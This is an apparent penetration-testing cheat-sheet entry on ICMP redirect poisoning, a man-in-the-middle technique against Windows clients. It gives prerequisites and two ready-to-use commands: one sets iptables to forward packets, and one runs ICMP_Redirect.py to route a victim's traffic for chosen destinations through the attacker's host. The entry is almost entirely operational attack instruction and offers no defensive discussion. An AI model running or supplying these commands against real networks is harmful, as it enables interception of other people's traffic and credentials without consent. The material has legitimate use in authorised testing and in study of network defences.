---
technique: ICMPRedirect
category: mitm
targets: Windows Clients
protocols: ICMP, IP
remote_capable: true
tags: mitm icmp-redirect routing responder ad
---

# ICMPRedirect

ICMP Redirect poisoning tells a client to route traffic for selected destinations through an attacker-controlled next hop. Use it when the network accepts ICMP redirect messages and the attacker can observe or influence the victim's routing path.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Same path | The attacker must be in a position where redirect messages are accepted by the client |
| Forwarding | The attacker host must forward traffic after becoming the route |
| Target route | Pick specific destination routes to avoid broad network disruption |

## Linux

### iptables forwarding

#bash #forwarding #native

Allow forwarded packets through the local firewall before redirecting victim traffic.

```sh title:"Allow forwarded packets with iptables"
iptables --policy FORWARD ACCEPT
```
<!-- cheat -->

### ICMP_Redirect.py

#python #responder #icmp

Send ICMP redirect messages that route selected destinations through the attacker.

```sh title:"Send ICMP redirects for selected routes"
python3 tools/ICMP_Redirect.py --interface "$interface" --ip "$lhost" --gateway "$gateway" --target "$target_ip" --route "$route_ip" --secondaryroute "$secondary_route_ip"
```
<!-- cheat
import tun_ip
var interface
var gateway
var target_ip
var route_ip
var secondary_route_ip
-->
